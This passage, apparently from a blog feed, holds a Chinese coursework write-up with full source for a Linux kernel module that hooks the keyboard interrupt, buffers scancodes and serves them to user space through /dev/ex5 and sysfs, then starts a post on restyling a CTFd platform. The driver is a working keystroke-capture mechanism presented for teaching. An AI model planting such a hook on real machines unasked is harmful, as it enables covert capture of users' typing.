    <content type="html"><![CDATA[<p>Unix 系统分析大作业，主要实现在内核模块中截获键盘中断扫描码存入驱动程序的自定义缓冲区，并通过用户空间应用程序打开设备以获取相应的扫描码。</p><a id="more"></a><p>在学习 Kernel Exploitation 时接触到 2017-CISCN-babydriver 这道题，其中也是注册了一个字符设备，注册设备的过程直接可以搬来用。</p><h1 id="一、-系统需求"><a href="#一、-系统需求" class="headerlink" title="一、 系统需求"></a>一、 系统需求</h1><ol><li>设计一个字符设备驱动程序，要求完成以下功能：<ol><li>通过键盘中断来记录用户按键，并保存在内部缓冲区中；</li><li>驱动程序提供 <code>read</code> 方法，应用程序可以来读按键缓冲区数据；</li><li>驱动程序实现 sysfs，提供 <code>count</code> 属性（读），用于获得当前缓冲区未读的按键数量，提供 <code>buf_size</code> 属性（读、写），用于获取和设置按键缓冲区大小。</li><li>在 <code>/dev</code> 目录下，创建对应的设备文件（文件名、主设备号、次设备号），可以静态创建，也可以在驱动程序中动态创建。</li></ol></li><li>其他要求：<ol><li>编写一个应用程序来测试上述驱动，读取按键、读取 <code>count</code>、<code>buf_size</code> 等属性；</li><li>可以直接访问对应的 sysfs 下文件，访问 <code>count</code> 及 <code>buf_size</code> 属性。</li></ol></li></ol><h1 id="二、-原理"><a href="#二、-原理" class="headerlink" title="二、 原理"></a>二、 原理</h1><ol><li>中断指在接收到来自外围硬件的异步信号，或来自软件的同步信号之后，处理器将会进行相应的硬件／软件处理。在内核模块中，通过中断请求（IRQ）来截获键盘中断，并将对应按键的扫描码存储在自定义的缓冲区中。</li><li>Linux 中的字符设备提供连续的数据流，应用程序可以顺序读取，通常不支持随机存取。相反，此类设备支持按字节/字符来读写数据。举例来说，键盘、串口、调制解调器都是典型的字符设备。通过编写内核模块，动态创建一个字符设备驱动程序，提供相应的 read 函数让用户空间对存储的键盘扫描码进行访问。</li><li>Sysfs 是 Linux 2.6 所提供的一种虚拟文件系统。这个文件系统不仅可以把设备（devices）和驱动程序（drivers）的信息从内核输出到用户空间，也可以用来对设备和驱动程序做设置。在驱动程序中实现 sysfs，创建相关属性来读写对模块中的某些全局变量。</li></ol><h1 id="三、-核心源程序代码及说明"><a href="#三、-核心源程序代码及说明" class="headerlink" title="三、 核心源程序代码及说明"></a>三、 核心源程序代码及说明</h1><p>一开始对一些全局变量进行定义，驱动程序相关的有设备号、字符设备结构体以及对应的类。在截获键盘中断的部分设置了两个无符号字符型变量用于存储键盘扫描码和状态，<code>key_count</code> 和 <code>buf_size</code> 分别是字符设备驱动程序对应的两个属性，key_buf 是用于存储键盘扫描码的 kfifo 缓冲区队列，最后初始化一个互斥锁、一个自旋锁和一个等待队列：</p><pre><code class="cpp">// Variables for device creationdev_t dev_id; // 设备号struct cdev key_dev; // 字符设备结构体struct class *key_class; // 字符设备对应的类// Variables for keyboard interruptstatic unsigned char scancode, status; // 键盘扫描码、状态static int key_count = 0; // 按键次数记录static int buf_size = 20, original_size; // 存储扫描码的缓冲区大小static struct kfifo key_buf; // 内核队列DEFINE_MUTEX(buf_lock); // 互斥锁DEFINE_SPINLOCK(key_lock); // 自旋锁static DECLARE_WAIT_QUEUE_HEAD(waitq); // 等待</code></pre><p>实现工作队列调度函数，其中获取每次键盘中断的扫描码，并且将按下按键的扫描码存入 kfifo 队列，并将 <code>key_count</code> 自加 1。如果队列满，则将第一个元素出队列。每次检测 <code>buf_size</code> 是否改变，如果改变则更新 <code>original_size</code>，并将原始的 <code>key_buf</code> 释放后重新申请一块内存作为新的 kfifo 队列。最后唤醒等待队列：</p><pre><code class="cpp">void key_work_func(struct work_struct *q) { // 工作队列调度函数    int ret; // 返回值    unsigned char code, t;    spin_lock(&amp;key_lock); // 加上自旋锁    code = scancode; // 获取当前扫描码    spin_unlock(&amp;key_lock);    if (code == 0xe0) { // 某些按键的特征符号        ;    } else if (code &amp; 0x80) { // 释放按键        ;    } else { // 按下按键        mutex_lock(&amp;buf_lock);        if (kfifo_is_full(&amp;key_buf)) {            kfifo_out(&amp;key_buf, &amp;t, sizeof(unsigned char));        }        kfifo_in(&amp;key_buf, (void *)&amp;code, sizeof(unsigned char)); // 将扫描码入队列        key_count++;        printk(&quot;[DEBUG] code = 0x%x, key_count = %d.\n&quot;, code, key_count);        if (buf_size != original_size) { // 判断缓冲区大小是否改变            printk(&quot;[DEBUG] buf_size = %d (original buf_size = %d).\n&quot;, buf_size, original_size);            original_size = buf_size;            kfifo_free(&amp;key_buf); // 释放原本的kfifo队列            ret = kfifo_alloc(&amp;key_buf, buf_size, GFP_ATOMIC); // 重新申请一块内存作为新的队列            if (ret) {                printk(&quot;[!] Allocate memory failed.\n&quot;);                return ret;            }        }        wake_up_interruptible(&amp;waitq); // 唤醒睡眠进程        mutex_unlock(&amp;buf_lock);    }}</code></pre><p>声明工作队列 <code>key_work</code>，定义函数 <code>key_int_handler</code> 来获取每次键盘中断，并在中断下半部调度工作队列：</p><pre><code class="cpp">DECLARE_WORK(key_work, key_work_func); // 声明工作队列irq_handler_t key_int_handler(int irq, void *dev) {    spin_lock(&amp;key_lock);    scancode = inb(0x60); // 获取扫描码    spin_unlock(&amp;key_lock);    spin_lock(&amp;key_lock);    status = inb(0x64); // 获取按键状态    spin_unlock(&amp;key_lock);    schedule_work(&amp;key_work); // 调度工作队列    return (irq_handler_t)IRQ_HANDLED;}</code></pre><p>实现对字符设备驱动程序的 <code>read</code> 函数。先对 <code>count</code> 字段进行判断，然后在等待进程被唤醒且满足给定条件后开始读取扫描码。每次将队列中指定长度的扫描码读出并传递到用户空间：</p><pre><code class="cpp">static ssize_t myread(struct file *filp, char __user *buf, size_t count, loff_t *pos) { // 读设备函数    unsigned char *c;    int ret;    if (count == 0) { // 传入的count值不能为0        printk(&quot;[!] Count can not be 0.\n&quot;);        return -1;    }    printk(&quot;[DEBUG] kfifo_len = %d.\n&quot;, kfifo_len(&amp;key_buf));    if (wait_event_interruptible(waitq, (kfifo_len(&amp;key_buf) &gt;= count))) // 睡眠并等待唤醒        return -ERESTARTSYS;    c = (unsigned char *)kmalloc(count, GFP_KERNEL); // 申请一块内存    mutex_lock(&amp;buf_lock);    kfifo_out(&amp;key_buf, c, count); // 将指定长度扫描码数据出队列    mutex_unlock(&amp;buf_lock);    printk(&quot;[+] Copy buffer to user: %s.\n&quot;, c);    ret = copy_to_user(buf, c, count); // 将出队列的扫描码传给用户空间    kfree(c); // 释放申请的内存空间    c = 0; // 防止UAF    return count;}</code></pre><p>字符设备驱动程序对应的 <code>open</code> 和 <code>release</code> 函数都不做任何额外的操作，最后初始化一个全局结构体 <code>key_fops</code>，即用于存储设备驱动程序的三种操作：</p><pre><code class="cpp">static int myopen(struct inode *inode, struct file *filp) { // 打开设备函数    printk(&quot;[+] Device opened.\n&quot;);    return 0;}static int myrelease(struct inode *inode, struct file *filp) { // 释放设备函数    printk(&quot;[+] Device released.\n&quot;);    return 0;}struct file_operations key_fops = { // 初始化文件访问操作函数    .open = myopen,    .read = myread,    .release = myrelease,};</code></pre><p>为了实现 <code>key_count</code> 和 <code>buf_size</code> 两个属性，需要分别定义两个属性的读写函数：</p><pre><code class="cpp">static ssize_t key_count_show(struct device *o, struct device_attribute *attr, char *buf) { // 属性key_count的读函数    return sprintf(buf, &quot;%d\n&quot;, key_count);}static ssize_t key_count_store(struct device *o, struct device_attribute *attr, const char *buf, size_t count) { // 属性key_count的写函数    sscanf(buf, &quot;%d&quot;, &amp;key_count);    return count;}static ssize_t buf_size_show(struct device *o, struct device_attribute *attr, char *buf) { // 属性buf_size的读函数    return sprintf(buf, &quot;%d\n&quot;, buf_size);}static ssize_t buf_size_store(struct device *o, struct device_attribute *attr, const char *buf, size_t count) { // 属性buf_size的写函数    sscanf(buf, &quot;%d&quot;, &amp;buf_size);    return count;}// https://blog.csdn.net/njuitjf/article/details/16849333static DEVICE_ATTR(key_count, 0444, key_count_show, key_count_store); // 创建字符设备属性key_countstatic DEVICE_ATTR(buf_size, 0664, buf_size_show, buf_size_store); // 创建字符设备属性buf_size</code></pre><p>接下来定义一个 <code>attribute</code> 结构体 <code>key_attrs</code>，存入两个全局变量对应的属性，并创建一个 <code>attribute_group</code> 结构体 <code>key_group</code> 存储 <code>key_attrs</code>：</p><pre><code class="cpp">static struct attribute *key_attrs[] = {    &amp;dev_attr_key_count.attr,    &amp;dev_attr_buf_size.attr,    NULL,};static const struct attribute_group key_group = {    .attrs = key_attrs,};</code></pre><p>在模块的入口函数中，先创建一个 kfifo 队列，用于存储键盘扫描码；然后注册中断请求服务，并设置函数 <code>key_int_handler</code> 作为中断服务函数：</p><pre><code class="cpp">    // Allocate kfifo    printk(&quot;[DEBUG] buf_size = %d.\n&quot;, buf_size);    original_size = buf_size; // 存储原始缓冲区大小    ret = kfifo_alloc(&amp;key_buf, buf_size, GFP_ATOMIC); // 申请kfifo队列    if (ret) {        printk(&quot;[!] Allocate memory failed.\n&quot;);        return ret;    }    printk(&quot;[+] Allocate kfifo successfully.\n&quot;);    // Trigger interrupt    ret = request_irq(1, (irq_handler_t)key_int_handler, IRQF_SHARED, &quot;Key Hook&quot;, (void *)key_int_handler); // 申请IRQ    if (ret) {        printk(&quot;[!] Request irq failed.\n&quot;);        return ret;    }    printk(&quot;[+] Request irq successfully.\n&quot;);</code></pre><p>接下来按顺序分别分配设备编号、初始化字符设备、添加字符设备到系统中、创建一个类并注册到内核中以及创建一个设备驱动程序并注册到 sysfs 中。最后通过 sysfs 借口创建驱动程序对应的两个属性。中间如果有发生错误，就会依次删除先前创建的内容：</p><pre><code class="cpp">    // Register devices    printk(&quot;[*] Invoke alloc_chrdev_region.\n&quot;);    ret = alloc_chrdev_region(&amp;dev_id, 0, 1, &quot;ex5&quot;); // 动态分配设备编号    if (ret &gt;= 0) {        printk(&quot;[*] Invoke cdev_init.\n&quot;);        cdev_init(&amp;key_dev, &amp;key_fops); // 初始化字符设备        key_dev.owner = THIS_MODULE; // 设置实现驱动的模块为当前模块        printk(&quot;[*] Invoke cdev_add.\n&quot;);        ret = cdev_add(&amp;key_dev, dev_id, 1); // 添加字符设备到系统中        if (ret &gt;= 0) {            printk(&quot;[*] Invoke class_create.\n&quot;);            key_class = class_create(THIS_MODULE, &quot;ex5&quot;); // 创建一个类并注册到内核中            if (key_class) {                printk(&quot;[*] Invoke device_create.\n&quot;);                dev = device_create(key_class, NULL, dev_id, NULL, &quot;ex5&quot;); // 创建一个设备并注册到sysfs中                if (dev) {                    printk(&quot;[*] Invoke sysfs_create_group.\n&quot;);                    // http://linux-kernel.2935.n7.nabble.com/kernel-BUG-at-fs-sysfs-group-c-65-td612891.html                    printk(&quot;[DEBUG] struct device *dev-&gt;kobj = %p.\n&quot;, &amp;dev-&gt;kobj);                    ret = sysfs_create_group(&amp;dev-&gt;kobj, &amp;key_group); // 通过sysfs接口创建驱动对应的属性                    if (ret == 0) { // 创建成功后直接跳转并返回0                        goto success;                    } else {                        printk(&quot;[!] Invoke sysfs_create_group failed.\n&quot;);                        device_destroy(key_class, dev_id); // 删除设备                    }                } else {                    printk(&quot;[!] Invoke device_create failed.\n&quot;);                    class_destroy(key_class); // 删除类                }            } else {                printk(&quot;[!] Invoke class_create failed.\n&quot;);            }            cdev_del(&amp;key_dev); // 删除字符设备        } else {            printk(&quot;[!] Invoke cdev_add failed.\n&quot;);        }        unregister_chrdev_region(dev_id, 1); // 释放设备编号        return ret;    }failed:    printk(&quot;[!] Invoke alloc_chrdev_region failed.\n&quot;);    return ret;success:    printk(&quot;[+] Create charactor device successfully.\n&quot;);    return 0;</code></pre><p>最后在模块退出时分别释放 IRQ、释放 kfifo 队列、删除设备驱动程序、删除类、删除字符设备以及释放设备编号：</p><pre><code class="cpp">static void __exit hello_exit(void) { // 模块出口函数    printk(&quot;========== [+] Remove module. ==========\n&quot;);    printk(&quot;[*] Free irq.\n&quot;);    free_irq(1, (void *)key_int_handler); // 释放IRQ    printk(&quot;[*] Free kfifo.\n&quot;);    kfifo_free(&amp;key_buf); // 释放队列    printk(&quot;[*] Invoke device_destroy.\n&quot;);    device_destroy(key_class, dev_id); // 删除设备    printk(&quot;[*] Invoke class_destroy.\n&quot;);    class_destroy(key_class); // 删除类    printk(&quot;[*] Invoke cdev_del.\n&quot;);    cdev_del(&amp;key_dev); // 删除字符设备    printk(&quot;[*] Invoke unregister_chrdev_region.\n&quot;);    unregister_chrdev_region(dev_id, 1); // 释放设备编号}</code></pre><p>在用户空间编写应用程序来读取驱动程序中存储的扫描码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#define BUF_SIZE 0x40 // 设置缓冲区int main() {    int fd, c, i;    unsigned char buf[BUF_SIZE]; // 初始化缓冲区    // sudo mknod /dev/ex4 c 444 0    fd = open(&quot;/dev/ex5&quot;, O_RDONLY); // 打开字符设备    if (fd &lt; 0) {        printf(&quot;[!] File open error.\n&quot;);        return -1;    }    while (1) {        c = read(fd, buf, BUF_SIZE); // 读取字符设备中的扫描码        printf(&quot;[+] Read scancode: %s (%d).\n&quot;, buf, c); // 把扫描码以字符串的形式输出    }    close(fd); // 关闭字符设备    return 0;}</code></pre><h1 id="四、-程序测试及结果"><a href="#四、-程序测试及结果" class="headerlink" title="四、 程序测试及结果"></a>四、 程序测试及结果</h1><p>安装模块后，看到字符设备驱动程序已经正常创建，且开始存储键盘的扫描码：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/1.png" srcset="/img/loading.gif" alt></p><p>在运行编写好的用户程序，看到从 kfifo 队列中读取出了指定长度的字节：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/2.png" srcset="/img/loading.gif" alt></p><p>查看 <code>key_count</code> 的值，使用 dmesg 查看得到 <code>key_count</code> 为 113，然后输入回车查看 <code>/sys/class</code> 下的存储的驱动程序属性 <code>key_count</code> 为 114，正好时输入了回车后自加了 1：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/3.png" srcset="/img/loading.gif" alt></p><p>查看此时 <code>buf_size</code> 的值为 20，然后修改其值为 40（因为 kfifo 的申请会将传入的长度自动对其到 2 的幂次方，故原本的 kfifo 队列长度应该为 32，修改后的长度变为 64）：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/4.png" srcset="/img/loading.gif" alt></p><p>此时查看输出 <code>buf_size</code> 已改变：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/5.png" srcset="/img/loading.gif" alt></p><p>再修改用户应用程序中的 <code>BUF_SIZE</code> 为 0x40，也可以正常读取到：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/6.png" srcset="/img/loading.gif" alt></p><p>如果再把驱动程序中的 <code>buf_size</code> 改小，就会导致 kfifo 队列中的元素最多为 32 个（<code>buf_size</code> 为 20 会自动向上对齐到 2 的幂次方），而应用程序中必须要读 0x40 个字符，永远达到不了标准，就会导致永远读取不到数据：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/7.png" srcset="/img/loading.gif" alt></p><h1 id="五、-总结"><a href="#五、-总结" class="headerlink" title="五、 总结"></a>五、 总结</h1><p>在这次的实验中，熟悉了字符设备驱动程序以及 sysfs，并且将先前学过的内核数据结构、中断、进程调度、进程同步等相关知识结合，对 Linux 内核有了更深的理解。</p><h1 id="附录：代码"><a href="#附录：代码" class="headerlink" title="附录：代码"></a>附录：代码</h1><pre><code class="cpp">#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/kfifo.h&gt;#include &lt;linux/workqueue.h&gt;#include &lt;linux/interrupt.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/uaccess.h&gt;#include &lt;linux/cdev.h&gt;MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;assassinq&quot;);MODULE_DESCRIPTION(&quot;create char device module&quot;);// Variables for device creationdev_t dev_id; // 设备号struct cdev key_dev; // 字符设备结构体struct class *key_class; // 字符设备对应的类// Variables for keyboard interruptstatic unsigned char scancode, status; // 键盘扫描码、状态static int key_count = 0; // 按键次数记录static int buf_size = 20, original_size; // 存储扫描码的缓冲区大小static struct kfifo key_buf; // 内核队列DEFINE_MUTEX(buf_lock); // 互斥锁DEFINE_SPINLOCK(key_lock); // 自旋锁static DECLARE_WAIT_QUEUE_HEAD(waitq); // 等待void key_work_func(struct work_struct *q) { // 工作队列调度函数    int ret; // 返回值    unsigned char code, t;    spin_lock(&amp;key_lock); // 加上自旋锁    code = scancode; // 获取当前扫描码    spin_unlock(&amp;key_lock);    if (code == 0xe0) { // 某些按键的特征符号        ;    } else if (code &amp; 0x80) { // 释放按键        // printk(&quot;In work: released \&quot;%s\&quot;\n&quot;, mappings[code - 0x80]);    } else { // 按下按键        // printk(&quot;In work: pressed \&quot;%s\&quot;\n&quot;, mappings[code]);        mutex_lock(&amp;buf_lock);        // if (kfifo_is_full(&amp;key_buf)) {        //     kfifo_out(&amp;key_buf, &amp;t, sizeof(unsigned char));        // }        kfifo_in(&amp;key_buf, (void *)&amp;code, sizeof(unsigned char)); // 将扫描码入队列        key_count++;        printk(&quot;[DEBUG] code = 0x%x, key_count = %d.\n&quot;, code, key_count);        if (buf_size != original_size) { // 判断缓冲区大小是否改变            printk(&quot;[DEBUG] buf_size = %d (original buf_size = %d).\n&quot;, buf_size, original_size);            original_size = buf_size;            kfifo_free(&amp;key_buf); // 释放原本的kfifo队列            ret = kfifo_alloc(&amp;key_buf, buf_size, GFP_ATOMIC); // 重新申请一块内存作为新的队列            if (ret) {                printk(&quot;[!] Allocate memory failed.\n&quot;);                return ret;            }        }        wake_up_interruptible(&amp;waitq); // 唤醒睡眠进程        mutex_unlock(&amp;buf_lock);    }}DECLARE_WORK(key_work, key_work_func); // 声明工作队列irq_handler_t key_int_handler(int irq, void *dev) {    spin_lock(&amp;key_lock);    scancode = inb(0x60); // 获取扫描码    spin_unlock(&amp;key_lock);    spin_lock(&amp;key_lock);    status = inb(0x64); // 获取按键状态    spin_unlock(&amp;key_lock);    // printk(&quot;Key interrupt: scancode = 0x%x, status = 0x%x\n&quot;, scancode, status);    schedule_work(&amp;key_work); // 调度工作队列    return (irq_handler_t)IRQ_HANDLED;}static int myopen(struct inode *inode, struct file *filp) { // 打开设备函数    printk(&quot;[+] Device opened.\n&quot;);    return 0;}static ssize_t myread(struct file *filp, char __user *buf, size_t count, loff_t *pos) { // 读设备函数    unsigned char *c;    int ret;    if (count == 0) { // 传入的count值不能为0        printk(&quot;[!] Count can not be 0.\n&quot;);        return -1;    }    printk(&quot;[DEBUG] kfifo_len = %d.\n&quot;, kfifo_len(&amp;key_buf));    if (wait_event_interruptible(waitq, (kfifo_len(&amp;key_buf) &gt;= count))) // 睡眠并等待唤醒        return -ERESTARTSYS;    c = (unsigned char *)kmalloc(count, GFP_KERNEL); // 申请一块内存    mutex_lock(&amp;buf_lock);    kfifo_out(&amp;key_buf, c, count); // 将指定长度扫描码数据出队列    mutex_unlock(&amp;buf_lock);    printk(&quot;[+] Copy buffer to user: %s.\n&quot;, c);    ret = copy_to_user(buf, c, count); // 将出队列的扫描码传给用户空间    kfree(c); // 释放申请的内存空间    c = 0; // 防止UAF    return count;}static int myrelease(struct inode *inode, struct file *filp) { // 释放设备函数    printk(&quot;[+] Device released.\n&quot;);    return 0;}struct file_operations key_fops = { // 初始化文件访问操作函数    .open = myopen,    .read = myread,    .release = myrelease,};static ssize_t key_count_show(struct device *o, struct device_attribute *attr, char *buf) { // 属性key_count的读函数    return sprintf(buf, &quot;%d\n&quot;, key_count);}static ssize_t key_count_store(struct device *o, struct device_attribute *attr, const char *buf, size_t count) { // 属性key_count的写函数    sscanf(buf, &quot;%d&quot;, &amp;key_count);    return count;}static ssize_t buf_size_show(struct device *o, struct device_attribute *attr, char *buf) { // 属性buf_size的读函数    return sprintf(buf, &quot;%d\n&quot;, buf_size);}static ssize_t buf_size_store(struct device *o, struct device_attribute *attr, const char *buf, size_t count) { // 属性buf_size的写函数    sscanf(buf, &quot;%d&quot;, &amp;buf_size);    return count;}// https://blog.csdn.net/njuitjf/article/details/16849333static DEVICE_ATTR(key_count, 0444, key_count_show, key_count_store); // 创建字符设备属性key_countstatic DEVICE_ATTR(buf_size, 0664, buf_size_show, buf_size_store); // 创建字符设备属性buf_sizestatic struct attribute *key_attrs[] = {    &amp;dev_attr_key_count.attr,    &amp;dev_attr_buf_size.attr,    NULL,};static const struct attribute_group key_group = {    .attrs = key_attrs,};static int __init hello_init(void) { // 模块入口函数    int ret;    struct device *dev;    printk(&quot;========== [+] Init module. ==========\n&quot;);    // ret = register_chrdev(444, &quot;ex4HookDriver&quot;, &amp;key_fops);    // if (ret) {    //     printk(&quot;[!] Unable to register character device.\n&quot;);    //     return ret;    // }    // Allocate kfifo    printk(&quot;[DEBUG] buf_size = %d.\n&quot;, buf_size);    original_size = buf_size; // 存储原始缓冲区大小    ret = kfifo_alloc(&amp;key_buf, buf_size, GFP_ATOMIC); // 申请kfifo队列    if (ret) {        printk(&quot;[!] Allocate memory failed.\n&quot;);        return ret;    }    printk(&quot;[+] Allocate kfifo successfully.\n&quot;);    // Trigger interrupt    ret = request_irq(1, (irq_handler_t)key_int_handler, IRQF_SHARED, &quot;Key Hook&quot;, (void *)key_int_handler); // 申请IRQ    if (ret) {        printk(&quot;[!] Request irq failed.\n&quot;);        return ret;    }    printk(&quot;[+] Request irq successfully.\n&quot;);    // Register devices    printk(&quot;[*] Invoke alloc_chrdev_region.\n&quot;);    ret = alloc_chrdev_region(&amp;dev_id, 0, 1, &quot;ex5&quot;); // 动态分配设备编号    if (ret &gt;= 0) {        printk(&quot;[*] Invoke cdev_init.\n&quot;);        cdev_init(&amp;key_dev, &amp;key_fops); // 初始化字符设备        key_dev.owner = THIS_MODULE; // 设置实现驱动的模块为当前模块        printk(&quot;[*] Invoke cdev_add.\n&quot;);        ret = cdev_add(&amp;key_dev, dev_id, 1); // 添加字符设备到系统中        if (ret &gt;= 0) {            printk(&quot;[*] Invoke class_create.\n&quot;);            key_class = class_create(THIS_MODULE, &quot;ex5&quot;); // 创建一个类并注册到内核中            if (key_class) {                printk(&quot;[*] Invoke device_create.\n&quot;);                dev = device_create(key_class, NULL, dev_id, NULL, &quot;ex5&quot;); // 创建一个设备并注册到sysfs中                if (dev) {                    printk(&quot;[*] Invoke sysfs_create_group.\n&quot;);                    // http://linux-kernel.2935.n7.nabble.com/kernel-BUG-at-fs-sysfs-group-c-65-td612891.html                    printk(&quot;[DEBUG] struct device *dev-&gt;kobj = %p.\n&quot;, &amp;dev-&gt;kobj);                    ret = sysfs_create_group(&amp;dev-&gt;kobj, &amp;key_group); // 通过sysfs接口创建驱动对应的属性                    if (ret == 0) { // 创建成功后直接跳转并返回0                        goto success;                    } else {                        printk(&quot;[!] Invoke sysfs_create_group failed.\n&quot;);                        device_destroy(key_class, dev_id); // 删除设备                    }                } else {                    printk(&quot;[!] Invoke device_create failed.\n&quot;);                    class_destroy(key_class); // 删除类                }            } else {                printk(&quot;[!] Invoke class_create failed.\n&quot;);            }            cdev_del(&amp;key_dev); // 删除字符设备        } else {            printk(&quot;[!] Invoke cdev_add failed.\n&quot;);        }        unregister_chrdev_region(dev_id, 1); // 释放设备编号        return ret;    }failed:    printk(&quot;[!] Invoke alloc_chrdev_region failed.\n&quot;);    return ret;success:    printk(&quot;[+] Create charactor device successfully.\n&quot;);    return 0;}static void __exit hello_exit(void) { // 模块出口函数    printk(&quot;========== [+] Remove module. ==========\n&quot;);    printk(&quot;[*] Free irq.\n&quot;);    free_irq(1, (void *)key_int_handler); // 释放IRQ    printk(&quot;[*] Free kfifo.\n&quot;);    kfifo_free(&amp;key_buf); // 释放队列    printk(&quot;[*] Invoke device_destroy.\n&quot;);    device_destroy(key_class, dev_id); // 删除设备    printk(&quot;[*] Invoke class_destroy.\n&quot;);    class_destroy(key_class); // 删除类    printk(&quot;[*] Invoke cdev_del.\n&quot;);    cdev_del(&amp;key_dev); // 删除字符设备    printk(&quot;[*] Invoke unregister_chrdev_region.\n&quot;);    unregister_chrdev_region(dev_id, 1); // 释放设备编号}module_init(hello_init);module_exit(hello_exit);</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Unix 系统分析大作业，主要实现在内核模块中截获键盘中断扫描码存入驱动程序的自定义缓冲区，并通过用户空间应用程序打开设备以获取相应的扫描码。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>自定义CTFd颜色主题</title>
    <link href="blog.b3ale.cn/2020/05/20/%E8%87%AA%E5%AE%9A%E4%B9%89CTFd%E9%A2%9C%E8%89%B2%E4%B8%BB%E9%A2%98/"/>
    <id>blog.b3ale.cn/2020/05/20/%E8%87%AA%E5%AE%9A%E4%B9%89CTFd%E9%A2%9C%E8%89%B2%E4%B8%BB%E9%A2%98/</id>
    <published>2020-05-20T02:32:37.000Z</published>
    <updated>2020-05-25T05:34:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>今年校赛轮到 17 级来办了，搭建平台的时候踩的一些坑记录一下。</p><a id="more"></a><h1 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h1><p>以前练习平台其实搭过很多次，都是用 Ubuntu 或者直接 <code>docker-compose up</code> 起镜像。后来发现 <a href="https://hub.docker.com/r/ctfd/ctfd" target="_blank" rel="noopener">CTFd 在 Docker Hub 上</a>是有镜像的，直接拉下来就能装了。</p><pre><code class="bash">$ docker pull ctfd/ctfd$ screen docker run --name=&quot;ZJGSUCTF-2020&quot; -p 80:8000 -it ctfd/ctfd</code></pre><p>进入容器进行修改：</p><pre><code class="bash">$ docker ps -aCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES729035bc1dc7        ctfd/ctfd           &quot;/opt/CTFd/docker-en…&quot;   42 seconds ago      Up 38 seconds       0.0.0.0:80-&gt;8000/tcp     ZJGSUCTF-2020$ docker exec -it quizzical_mayer /bin/sh</code></pre><p>可以看到容器的启动脚本 <code>docker-entrypoint.sh</code>，其中用 <code>gunicorn</code> 作为 Web 服务器：</p><pre><code class="bash">/opt/CTFd $ tail docker-entrypoint.sh# Start CTFdecho &quot;Starting CTFd&quot;exec gunicorn &#39;CTFd:create_app()&#39; \    --bind &#39;0.0.0.0:8000&#39; \    --workers $WORKERS \    --worker-tmp-dir &quot;$WORKER_TEMP_DIR&quot; \    --worker-class &quot;$WORKER_CLASS&quot; \    --access-logfile &quot;$ACCESS_LOG&quot; \    --error-logfile &quot;$ERROR_LOG&quot;</code></pre><h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><p>对颜色的设置首先可以在 Admin Panel 里选择 Theme Color：</p><p><img src="/pics/自定义CTFd颜色主题/1.png" srcset="/img/loading.gif" alt></p><p>效果如下：</p><p><img src="/pics/自定义CTFd颜色主题/2.png" srcset="/img/loading.gif" alt></p><p>改了 Theme Color 后，Challenge 里的每个 Challenge Box 的颜色还是没变，显得不太协调，可以在 themes 下修改对应的 css：</p><pre><code class="bash">/opt/CTFd/CTFd/themes/core/static/css $ vi main.min.css</code></pre><p><code>.btn-dark</code> 是默认的 Challenge Box 的颜色：</p><pre><code class="css">.btn-dark {  color: #fff;  background-color: #343a40;  border-color: #343a40;}</code></pre><p>还有修改 Solved Challenge Box 的颜色：</p><pre><code class="bash">/opt/CTFd/CTFd/themes/core/static/css $ vi challenge-board.min.css</code></pre><p>对应的样式如下：</p><pre><code class="css">.solved-challenge {  background-color: #37d63e !important;  opacity: 0.4;  border: none;}</code></pre><p>改完后的效果如下：</p><p><img src="/pics/自定义CTFd颜色主题/3.png" srcset="/img/loading.gif" alt></p><h1 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h1><p>国外的开源项目总是会有一些问题，这里我们也要把对应的 <code>flag-icons.scss</code> 和 <code>__init__.py</code> 部分给删除，或者像 BUUOJ 一样改为 Taiwan SAR China：</p><pre><code class="bash">/opt/CTFd/CTFd $ grep -ir &quot;Taiwan&quot; *themes/core/assets/css/includes/flag-icons.scss:  // Taiwanutils/countries/__init__.py:    (&quot;TW&quot;, &quot;Taiwan&quot;),utils/countries/__pycache__/__init__.cpython-37.pyc:St. Martin)ZPMzSt. Pierre &amp; Miquelon)ZVCzSt. Vincent &amp; Grenadines)ZSDZSudan)ZSRSuriname)ZSJzSvalbard &amp; Jan Mayen)ZSZZ    Swaziland)ZSEZSweden)ZCHZ                                                                 Switzerland)ZSYZSyria)ZTWZTaiwan)ZTJZ</code></pre><p>由于这部分是用 Python 写的，不会实时更新，这里直接重启 <code>gunicorn</code> 来刷新缓存（重启第二个，也就是这里的 8 号进程）：</p><pre><code class="bash">/opt/CTFd $ ps aux | grep gunicorn    1 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -    8 ctfd      0:01 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   38 ctfd      0:00 grep gunicorn/opt/CTFd $ kill -HUP 8/opt/CTFd $ ps aux | grep gunicorn    1 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   39 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm 